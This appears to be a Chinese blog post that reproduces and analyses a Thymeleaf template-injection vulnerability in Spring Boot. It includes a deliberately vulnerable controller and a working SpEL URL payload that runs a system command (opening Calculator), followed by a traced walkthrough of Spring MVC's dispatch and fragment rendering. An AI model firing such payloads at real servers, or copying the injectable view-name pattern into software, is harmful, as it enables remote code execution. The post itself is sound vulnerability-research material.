class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/5/11 3:45 下午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Handler</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.Cacheable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/5/12 3:39 下午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/index1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThyController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam</span> String index3)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;index...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>正常访问URL，出现了500报错，因为此时我没有对应的模板文件才会报错，但是这个不影响漏洞的利用</p>
+<p><img src="9PW7aCWq0XIh8hrnZNkKgFlyqLTnstDjCszcSJRwe8w.png" alt="image"></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.163</span><span class="number">.154</span>:<span class="number">8090</span>/index1/index2?index3=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%<span class="number">20</span>-a%20Calculator%<span class="number">22</span>).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+<p><img src="w46yACUTr-5KrP5NK2MiVbv5Uan0SUbiGgyxdjkaVKU.png" alt="image"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先讲一下SpringMVC的一个工作流程</p>
+<ol>
+<li>客户端发起 HTTP 请求，请求会到达 DispatcherServlet。</li>
+<li>DispatcherServlet 接收到请求后会通过 HandlerMapping 确定当前请求需要调用哪个 Controller 对象，默认情况下使用的是 RequestMappingHandlerMapping。</li>
+<li>HandlerAdapter 负责将请求与 Controller 方法进行绑定，并处理方法的参数，准备请求数据。</li>
+<li>Controller 执行相应的业务逻辑，创建并绑定 Model 和 View，并返回 ModelAndView。</li>
+<li>ViewResolver 根据 View 的指定格式解析目标视图为完整的视图，并返回给 DispatcherServlet。</li>
+<li>DispatcherServlet 发送 Model 数据给 View 以便完成渲染，生成最终的响应结果。</li>
+<li>最终的响应结果返回给客户端浏览器，已经完成了整个 Spring MVC 的请求响应过程。</li>
+</ol>
+<p>在Spring MVC框架中是由DispatcherServlet作为前端控制器（Front Controller）来控制请求和响应、路由请求和处理 HTTP 请求的。</p>
+<p>org.springframework.web.servlet.DispatcherServlet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletWebRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.async.WebAsyncManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.async.WebAsyncUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerExecutionChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.NestedServletException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/5/18 4:19 下午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">doDispath</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 对于multipart类型需要特殊处理</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">processedRequest</span> <span class="operator">=</span> request;</span><br><span class="line">        <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">multipartRequestParsed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//定义模型与视图</span></span><br><span class="line">                <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">//异常</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">dispatchException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                     <span class="comment">// 预处理multipart文件上传数据，检查请求是否包含multipart/form-data</span></span><br><span class="line">                    processedRequest = <span class="built_in">this</span>.checkMultipart(request);</span><br><span class="line">                    multipartRequestParsed = processedRequest != request;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 获取处理器（通过RequestMapping找到希望匹配的处理器）</span></span><br><span class="line">                    mappedHandler = <span class="built_in">this</span>.getHandler(processedRequest);</span><br><span class="line">                    <span class="keyword">if</span> (mappedHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 如果没有找到合适的Handler，则返回404错误页面</span></span><br><span class="line">                        <span class="built_in">this</span>.noHandlerFound(processedRequest, response);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 根据获取的 Handler （处理方法或者对象）获取对应的 HandlerAdapter</span></span><br><span class="line">                    <span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> <span class="built_in">this</span>.getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line">                    <span class="comment">// 获取 Http 请求方法类型，以 GET 上述情况为例</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isGet</span> <span class="operator">=</span> <span class="string">&quot;GET&quot;</span>.equals(method);</span><br><span class="line">                    <span class="keyword">if</span> (isGet || <span class="string">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class="line">                        <span class="comment">// 执行 Last-Modified 头信息验证缓存是否需要更新，判断是否需要返回304</span></span><br><span class="line">                        <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 判断拦截器是否preHandle执行成功，如果有一个没有执行成功，则直接返回404错误页面；同时记录日志</span></span><br><span class="line">                    <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 调用Handler并获取返回结果（该结果严格意义上只是View和Model的容器）</span></span><br><span class="line">                    mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line">                    <span class="comment">// 检查异步任务，并不会立即执行，而是由WebAsyncManager 后期完成调度管理</span></span><br><span class="line">                    <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                        <span class="comment">// 对ModelAndView进行预处理</span></span><br><span class="line">                    <span class="built_in">this</span>.applyDefaultViewName(processedRequest, mv);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//执行Handler的后置处理器</span></span><br><span class="line">                    mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">                    dispatchException = var20;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var21) &#123;</span><br><span class="line">                    <span class="comment">// 添加try-catch代码块来捕捉所有Throwable类型的异常</span></span><br><span class="line">                    dispatchException = <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler dispatch failed&quot;</span>, var21);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 利用返回的mv进行页面渲染</span></span><br><span class="line">                <span class="built_in">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">                <span class="built_in">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var23) &#123;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">//对页面渲染完成调用拦截器中的AfterCompletion方法</span></span><br><span class="line">                <span class="built_in">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler processing failed&quot;</span>, var23));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">                    mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">                <span class="comment">//清除由多个部分组成的请求使用的所有资源</span></span><br><span class="line">                <span class="built_in">this</span>.cleanupMultipart(processedRequest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="doDispatch"><a href="#doDispatch" class="headerlink" title="doDispatch"></a>doDispatch</h3><p>checkMultipart </p>
+<p>判断请求是否为 Multipart 类型，并对请求处理进行必要的操作</p>
+<p>getHandler </p>
+<p>调用getHandler() 方法来确定具体的 Controller 处理器</p>
+<p>调用各自的 getHandler(request) 方法来获取对应的 HandlerExecutionChain 对象</p>
+<p>这个对象包含了要执行的controller handler和其拦截器链，它是一个管理一组拦截器链的实例，其中包含了一个或多个拦截器 HandlerInterceptor 以及目标对象和目标方法。</p>
+<p>如果某个 HandlerMapping 的 getHandler() 方法返回了该对象，则表示该 HandlerMapping 能够处理当前请求，此时就会将 HandlerExecutionChain 返回给 DispatcherServlet，让其执行相关业务逻辑</p>
+<h3 id="1-前端控制器拦截用户的请求"><a href="#1-前端控制器拦截用户的请求" class="headerlink" title="1.前端控制器拦截用户的请求"></a><strong>1.前端控制器拦截用户的请求</strong></h3><p>我们直接看doDispatch这个方法，首先是和传统的servlet一样传入：HttpServletRequest request, HttpServletResponse response。</p>
+<p>然后就是定义一些各种类型的变量，做初始化操作。</p>
+<p><img src="gM4QKwKFcwJHZPVp1K7uRlBPWxxNOfeC5PSvPs1fBjs.png" alt="image"></p>
+<p>然后来到513行是调用checkMultipart 方法检查是否包含multipart&#x2F;form-data 编码方式，有的话，就进行进一步的处理。514行将 multipartRequestParsed 变量设置为 true。</p>
+<p><img src="X8oo0HHQq3yTW7lfM2Ph1H4Mxl7WjJDEojfgzJH7YO0.png" alt="image"></p>
+<h3 id="2-处理器映射器执行用户的请求"><a href="#2-处理器映射器执行用户的请求" class="headerlink" title="2.处理器映射器执行用户的请求"></a><strong>2.处理器映射器执行用户的请求</strong></h3><p>然后来到515行的getHandler，我们直接进去分析。首先是判断一下handlerMappings是否为空。</p>
+<p><img src="pANthOzVC_ScNmdNOWddChdrfod16NZNy7kYrWl0yq0.png" alt="image"></p>
+<p>handlerMappings的初始化是在initHandlerMappings中进行的，扫描容器中所有的 HandlerMapping Bean，并将这些 Bean 添加到 handlerMappings 列表中。</p>
+<p><img src="WN2EnHZ_xyLglPRq-rYXr0xtMRCmtXu5fy-30jvN4qY.png" alt="image"></p>
+<p>回到getHandler，遍历handlerMappings 列表来查找匹配的处理器（即 Controller），并返回对应的 HandlerExecutionChain 实例。下图可以看到我们的index1的Controller和内置的error Controller</p>
+<p><img src="lna3ce4nVCydtd8coNVnehDaYqv_pdcG3qab3DA8MQA.png" alt="image"></p>
+<p>SpringMVC一共初始化了5个处理器映射器</p>
+<p><img src="upJsQXDdiyNT--4vjCqs_oF5wZpxE--M10Eh2bp05dw.png" alt="image"></p>
+<p>遍历拿到了我们的一个Controller和方法名以及返回值的类型（String）</p>
+<p><img src="39o45C1Lf7BSmiT2B3n4TGSAHJUKMR32k_BeKrOhVuc.png" alt="image"></p>
+<p>映射器给我们处理的Handler封装到了一个叫HandlerExecutionChain里面。而在HandlerExecutionChain对象里面有一个handler对象，是HandlerMethod类型的，这就是处理器映射器最终将我们的请求处理成的Handler对象</p>
+<h3 id="3-获取处理器适配器HandlerAdpater"><a href="#3-获取处理器适配器HandlerAdpater" class="headerlink" title="3.获取处理器适配器HandlerAdpater"></a><strong>3.获取处理器适配器HandlerAdpater</strong></h3><p>回到doDispatch，继续往下走到521行，这里调用了getHandlerAdapter方法。这个步骤是</p>
+<p><img src="NYCpxpSlZDfNo3YQWo8WBYj_pNirXQ2_QKgLoLHOW6M.png" alt="image"></p>
+<p>我们跟进去到了getHandlerAdapter。这里是对所有适配器进行遍历，查找支持该处理程序的适配器，最终将返回第一个支持该处理程序的适配器。并执行所需操作，例如解析请求参数、调用相应的业务逻辑、生成响应等。</p>
+<p><img src="G-bRju-URSTl6dq17pXyv2k3DrM-AWKP71tjoXNPyAU.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取处理器适配器    </span></span><br><span class="line"><span class="keyword">protected</span> HandlerAdapter <span class="title function_">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">// 处理器适配器集合不为空</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerAdapters != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerAdapters.iterator();</span><br><span class="line">        <span class="comment">// 遍历处理器适配器集合</span></span><br><span class="line">        <span class="keyword">while</span>(var2.hasNext()) &#123;</span><br><span class="line">            <span class="type">HandlerAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> (HandlerAdapter)var2.next();</span><br><span class="line">            <span class="comment">// 当前适配器是否支持handle处理器的处理</span></span><br><span class="line">            <span class="keyword">if</span> (adapter.supports(handler)) &#123;</span><br><span class="line">            <span class="comment">// 返回支持的适配器</span></span><br><span class="line">                <span class="keyword">return</span> adapter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 未找到合适的适配器，抛出异常</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;No adapter for handler [&quot;</span> + handler + <span class="string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>SpringMVC为我们初始化了以下4个处理器适配器：</p>
+<p><img src="tOgIA6c-N2YWDqhwtn2Qbk7k5AghIR-hZCq0HiuS8R4.png" alt="image"></p>
+<p><img src="A_6Jj_ulqGpI4sKH_XdvJLnanMb4cRytlb1jsAMEOzs.png" alt="image"></p>
+<p>回到doDispatch，继续往下走到531行。判断在请求发生之前有没有预处理拦截器。预处理拦截器一般用于身份验证、授权、日志记录等。</p>
+<p><img src="Ha3472ZAU3rQBGcGGP4zuBF0aBIrZCuyVVr2_KdlX4k.png" alt="image"></p>
+<h3 id="4-处理器适配器对Handler进行处理"><a href="#4-处理器适配器对Handler进行处理" class="headerlink" title="4.处理器适配器对Handler进行处理"></a><strong>4.处理器适配器对Handler进行处理</strong></h3><p>继续往下走到535行。从 mappedHandler对象获取handler对象，然后将其与请求(request)对象、响应(response)对象交给适配器(Adapter)进行调用。在适配器中调用处理程序的相应方法，通常是Controller中的某一个方法，并根据业务逻辑生成响应数据。最终结果存储在ModelAndView实例对象(mv)中。</p>
+<p><img src="mz9s1yEdL-un_gS7yP3V-vF9G0Lz8hCmnwX-8V47Z7w.png" alt="image"></p>
+<p>我们跟进去</p>
+<p><img src="64U7bf16Iv-0R3x8a2du3TE39qHgVByo-r2YFHPJGEA.png" alt="image"></p>
+<p>来到了RequestMappingHandlerAdapter类的handleInternal方法。首先是对请求进行检查(checkRequest)，接着调用invokeHandlerMethod函数执行处理程序(handlerMethod)的方法，并根据业务逻辑生成响应数据。最后，根据配置条件设置缓存控制(Cache-Control)头部信息并返回ModelAndView实例对象(mav)。</p>
+<p><img src="fgZ2tlRIQiY911Vkc4MqM2m2gWGsbvHtAaz5M9uZS9U.png" alt="image"></p>
+<p>来到invokeHandlerMethod(487)，我们跟进去。前面这些是根据请求参数，生成一个Web数据绑定器工厂(binderFactory)和模型工厂(modelFactory)。</p>
+<p><img src="zRxC97t-uBwsshqxp42aD7YC_Ch9qSmaLYnOEYP8lTg.png" alt="image"></p>
+<p>我们来到552行的invocableMethod.invokeAndHandle。它是用于执行处理程序(handlerMethod)的方法。我们跟进去；首先是调用invokeForRequest方法，该方法是实现@RequestBody注解的功能，将http请求报文解析为我们设置的对象。</p>
+<p><img src="9rAHyXBKXO7Id7wUFJfOugU6jeHVQMkCY2BBXqsawas.png" alt="image"></p>
+<p>我们跟进去；首先通过getMethodArgumentValues方法获取处理程序所需的参数，如日志所示，代码将请求参数打印到日志中。然后通过doInvoke方法执行接口的具体业务逻辑代码。</p>
+<p><img src="SxJ-W5GrA7Lj7xK4I422RDDOLz3N5jVL2pifCfV-2ig.png" alt="image"></p>
+<p>跟进61行的doInvoke，进入到里面。 获得被桥接的⽅法（101），开打访问权限（102）</p>
+<p><img src="hDXsDmsQ8OKUP42Lt9CpkO3o3phgis_SN1CBQtWKIFY.png" alt="image"></p>
+<p>这里的105行，调用了invoke。通过反射，调⽤ Controller 中响应的⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> KotlinDetector.isSuspendingFunction(method) ? CoroutinesUtils.invokeSuspendingFunction(method, <span class="built_in">this</span>.getBean(), args) : method.invoke(<span class="built_in">this</span>.getBean(), args);</span><br></pre></td></tr></table></figure>
+<p>最后通过反射进行调用。先是检查调用者对方法的访问权限，并获取需要调用方法的MethodAccessor实例，最后调用MethodAccessor的invoke方法来执行相应的方法。</p>
+<p><img src="Q1ujRJo4a6PB82VUNdfQm3z1sknvesEAVhwQWRjE19c.png" alt="image"></p>
+<p>最终回到invokeHandlerMethod，进入到了if里面getModelAndView(554)。</p>
+<p><img src="Rxha9Q6rsoH1nWYawYNyaeVr5A09eKm-tMiZy0CpWnc.png" alt="image"></p>
+<p>我们跟进去看看；这里是根据mavContainer对象（包含视图名称、数据模型等信息）创建并返回ModelAndView对象</p>
+<p><img src="v6mT0K9RBwObIUIOod4qs6UuXvkrI6rcll8eMSoPwWA.png" alt="image"></p>
+<p>至此，我们就拿到了mav，也就是ModelAndView </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[view=<span class="string">&quot;__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;</span>open -a Calculator<span class="string">&quot;).getInputStream()).next()&#125;__::.x&quot;</span>; model=&#123;&#125;]</span><br></pre></td></tr></table></figure>
+<p><img src="VmLlO7DWY78gR-N4G226bRLW3ViXKVYYVnCmm_kVfQc.png" alt="image"></p>
+<p>最终回到doDispatch，然后来到540行。</p>
+<p>这里调用请求处理器适配器的postHandle()方法，对Web请求在处理完成后做一些额外的工作，比如在模型和视图参数中添加、删除或修改属性值等，以及对响应对象进行操作，比如设置相应头信息、状态码以及重定向等</p>
+<p><img src="XxxuU2r4n3E1mhBz98cQ8EpO5e5cyQvEXA3CS5H3Jcs.png" alt="image"></p>
+<h3 id="5-处理派发结果"><a href="#5-处理派发结果" class="headerlink" title="5.处理派发结果"></a>5.处理派发结果</h3><p>SpringMVC通过处理器适配器将Handler处理成ModelAndView了。</p>
+<p>下面我们来看到548行</p>
+<p><img src="hArY-lvFyp6UFLRTBFmoJ7epnCYupS_c2aCT3w8ZhWE.png" alt="image"></p>
+<p>我们跟进去看看，processDispatchResult方法实现了请求的分发以及结果的处理。在具体工作中，该方法接收HTTP请求和响应对象、当前匹配到的HandlerExecutionChain处理链、可能存在的ModelAndView模型视图对象以及处理过程中可能抛出的异常等参数，然后根据不同情况，调用相应的方法进行处理。</p>
+<p><img src="6LaA8CBRDPXwcBkWLW8Np83AKH9CBoWQcPUdeEVStdU.png" alt="image"></p>
+<p>搜索发现，有一个叫render的方法对mv进行处理，我们跟进去。</p>
+<p><img src="BLLiYnuYt1DGvjZPJyZz3usS8B6dg2M3nbb_jeps36o.png" alt="image"></p>
+<p>750行获取View视图对象，进去看看。循环遍历初始化好的视图解析器进行解析处理，最终得到一个View视图对象</p>
+<p><img src="dASw_k2xVTOLT47G7ts2HTUS_p_mOzxMqupOXiozV6E.png" alt="image"></p>
+<p>回到render；来到770行，我们跟进去看看。</p>
+<p>这里调用了renderFragment方法</p>
+<p><img src="h9ffxi7Kg30LTUg5Nc9oxdQv8kWJr1ZbGWdEZL7AsxU.png" alt="image"></p>
+<p>继续跟进去renderFragment；在101行，判断viewTemplateName是否包含::如果包含的话进入else分支，进行表达式预处理。</p>
+<p>首先是传入configuration 对象作为参数，获取一个标准表达式解析器对象parser；然后是通过在 parser对象上调用 parseExpression() 方法，传入两个参数：当前渲染的页面上下文对象 context 和表示要渲染的 HTML 片段名称的字符串 “~{ + viewTemplateName + }”，得到一个 FragmentExpression 对象 fragmentExpression</p>
+<p><img src="TCrWTzmvZz2PUxJuax8-p7QwkNJ32uWS0ZR0Mpr7TwQ.png" alt="image"></p>
+<p>此时的viewTemplateName为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
+<p>viewTemplateName中包含::时，会给其加上~{}然后进行解析</p>
+<p><img src="QfzEJJwG2yPvKX6iPU5Zt1vI9B26heyMZlu0i1nzDf8.png" alt="image"></p>
+<p>parseExpression(109) 我们跟进去看看</p>
+<p><img src="Zz-P7UCZAzQ-ITKSeQtqYMXG0xw907ctzUqal1LTuxU.png" alt="image"></p>
+<p>跟进去preprocess。进行正则提取出__…__之间的东西</p>
+<p><img src="Glzsvp8QC3KxO_D6SqF4-rxzC7arF-ymCxjo6WyQh5o.png" alt="image"></p>
+<p>提取得到的</p>
